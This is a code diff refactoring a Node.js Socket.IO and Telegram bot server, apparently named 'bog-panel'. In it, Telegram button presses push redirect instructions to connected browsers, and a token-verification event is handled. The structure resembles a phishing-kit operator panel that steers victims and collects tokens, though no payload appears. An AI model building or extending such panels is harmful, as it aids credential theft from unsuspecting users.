@@ -183,29 +183,27 @@ io.on('connection', (socket) => {
     console.log('Cliente conectado:', socket.id);
     connectedClients.add(socket.id);
     
-    socket.on('process_action', async (data) => {
-        try {
-            const { action, messageId } = data;
-            console.log(`Procesando acción ${action} para mensaje ${messageId}`);
+socket.on('process_action', async (data) => {
+    try {
+        const { action, messageId } = data;
+        console.log(`Procesando acción ${action} para mensaje ${messageId}`);
 
-            const isVercel = process.env.VERCEL === '1';
-            const baseUrl = isVercel ? 'https://bog-panel.vercel.app' : '';
-            const { message, url } = handleRedirect(action, baseUrl);
+        const { message, url } = handleRedirect(action);
 
-            socket.emit('telegram_action', {
-                action: action,
-                messageId: messageId,
-                message: message,
-                redirect: url
-            });
-        } catch (error) {
-            console.error('Error al procesar acción:', error);
-            socket.emit('telegram_action', {
-                action: 'error',
-                message: 'Error al procesar la acción. Por favor intente nuevamente.'
-            });
-        }
-    });
+        socket.emit('telegram_action', {
+            action: action,
+            messageId: messageId,
+            message: message,
+            redirect: url
+        });
+    } catch (error) {
+        console.error('Error al procesar acción:', error);
+        socket.emit('telegram_action', {
+            action: 'error',
+            message: 'Error al procesar la acción. Por favor intente nuevamente.'
+        });
+    }
+});
 
     socket.on('token_verification', async (data) => {
         console.log('Recibida verificación de token:', data);
@@ -244,26 +242,19 @@ bot.on('callback_query', async (callbackQuery) => {
         console.error('Callback query inválido');
         return;
     }
-    
+
     try {
         const action = callbackQuery.data;
         const messageId = callbackQuery.message.message_id;
-        
-        console.log(`Acción recibida: ${action}, Message ID: ${messageId}`);
-        
-        // Configurar URL base según el entorno
-        const isVercel = process.env.VERCEL === '1';
-        const baseUrl = isVercel ? 'https://bog-panel.vercel.app' : '';
 
-        // Responder al callback query
         await bot.answerCallbackQuery(callbackQuery.id, {
-            text: action === 'finalizar' ? '✅ Proceso finalizado' : '✓ Acción procesada'
+            text: action === 'finalizar'
+                ? '✅ Proceso finalizado'
+                : '✓ Acción procesada'
         });
 
-        // Procesar la acción y obtener información de redirección
-        const { message, url } = handleRedirect(action, baseUrl);
+        const { message, url } = handleRedirect(action);
 
-        // Emitir el evento a todos los clientes conectados
         io.emit('telegram_action', {
             action: action,
             messageId: messageId,
